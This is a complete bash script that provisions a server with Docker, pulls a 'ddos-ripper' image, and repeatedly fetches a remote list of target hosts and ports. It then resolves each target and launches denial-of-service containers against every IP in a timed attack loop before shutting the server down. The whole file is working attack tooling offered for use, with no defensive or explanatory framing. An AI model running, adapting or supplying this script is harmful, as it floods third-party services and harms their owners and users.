# host init
sudo yum -y update
sudo yum search docker
sudo yum -y install docker
sudo systemctl start docker.service
# host init

# swop improvement
sudo fallocate -l 4G /swapfile
sudo dd if=/dev/zero of=/swapfile bs=1024 count=4194304
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
# swop improvement

export WGET_LINK=$3
export LINKS_FILE="/tmp/links.txt"
export NEW_LINKS="/tmp/links_new/links.txt"
export TMP_LINKS="/tmp/links_new/links_tmp.txt"
[[ -f $NEW_LINKS ]] && rm $NEW_LINKS
[[ -f $TMP_LINKS ]] && rm $TMP_LINKS

IMAGE="dieputindie/ddos-ripper:latest"
sudo docker pull $IMAGE

download_links() {
    sudo wget -N $WGET_LINK -P /tmp/links_new/ &>/tmp/response
    if cat /tmp/response | grep -q 'not retrieving'; then
        echo "no new file downloaded"
        return 1
    elif cat /tmp/response | grep -q 'Saving to'; then
        echo "new file downloaded. Prepearing and Converting"
        [[ -f $TMP_LINKS ]] && rm $TMP_LINKS
        sudo cp $NEW_LINKS $TMP_LINKS
        convert_links_file
        sudo docker rm -f $(docker ps -q -a) #removing all working containers in case of links.txt refresh and restart loop
        return 0
    else
        echo "Something wrong happened with file downloading. Response is:"
        cat /tmp/response
        exit 1
    fi
}

convert_links_file() {
    if file $TMP_LINKS | grep CRLF; then
        echo "$TMP_LINKS contains CRLF. Converting file"
        sudo vim $TMP_LINKS -c "set ff=unix" -c ":wq"
        sudo mv $TMP_LINKS $LINKS_FILE
    fi
}

if [ -s $LINKS_FILE ]; then
    echo "local links provided" && cat $LINKS_FILE
    convert_links_file
else
    echo "There is no local links.txt. Downloading"
    download_links
fi

while true; do
    download_links
    while read link; do
        while [ $(sudo docker ps | wc -l) -gt 3 ]; do
            sleep 60
            download_links && break 
        done
        echo "current link is $link"
        HOST=$(echo $link | awk -F ' ' '{print $1}')
        echo "digging " && sudo dig +short $HOST
        if [[ $HOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo $HOST >/tmp/ips.txt
        else
            sudo dig +short $HOST >/tmp/ips.txt
        fi

        cat /tmp/ips.txt
        while read ip; do
            while [ $(sudo docker ps | wc -l) -gt 3 ]; do
                sleep 60
            done
            echo "Current target is $ip"
            THIS_HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
            THIS_PORT=$(echo $link | awk -F ' ' '{print $2}')
            sudo docker stop -t $1 $(sudo docker run -e THIS_HOSTNAME=$THIS_HOSTNAME -e THIS_PORT=$THIS_PORT -e ENABLE_LOG=$2 -d --stop-signal 2 $IMAGE) &
            sleep 15
        done </tmp/ips.txt

    done <$LINKS_FILE
done
sleep $1 # waiting attack time after last links started, before server shutdown
sudo shutdown now
